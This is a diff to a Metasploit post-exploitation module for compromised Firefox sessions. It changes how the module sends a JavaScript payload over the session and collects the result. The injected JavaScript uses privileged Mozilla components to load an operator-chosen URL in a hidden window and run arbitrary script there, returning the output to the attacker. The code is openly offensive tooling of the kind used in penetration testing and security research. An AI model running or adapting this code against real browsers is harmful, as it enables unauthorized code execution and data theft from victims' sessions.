@@ -35,7 +35,8 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    results = cmd_exec(",JAVASCRIPT,#{js_payload},ENDSCRIPT,", nil, datastore['TIMEOUT'])
+    session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
+    results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore['TIMEOUT'])
 
     if results.present?
       print_good results
@@ -48,15 +49,15 @@ class Metasploit3 < Msf::Post
     js = datastore['SCRIPT'].strip
     %Q|
 
-      (function(){
+      (function(send){
         var hiddenWindow = Components.classes["@mozilla.org/appshell/appShellService;1"]
                                .getService(Components.interfaces.nsIAppShellService)
                                .hiddenDOMWindow;
 
         hiddenWindow.location = 'about:blank';
         var src = (#{JSON.unparse({ :src => js })}).src;
-        var XHR = hiddenWindow.XMLHttpRequest;
         var key = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
+
         hiddenWindow[key] = true;
         hiddenWindow.location = "#{datastore['URL']}";
         
@@ -65,7 +66,11 @@ class Metasploit3 < Msf::Post
             schedule(evt);
           } else {
             schedule(function(){
-              cb(hiddenWindow.Function(src)());
+              try {
+                send(hiddenWindow.Function('send', src)(send));
+              } catch (e) {
+                send("Error: "+e.message);
+              }
             }, 500);
           }
         };
@@ -77,7 +82,7 @@ class Metasploit3 < Msf::Post
         };
 
         schedule(evt);
-      })();
+      })(send);
 
     |.strip
   end
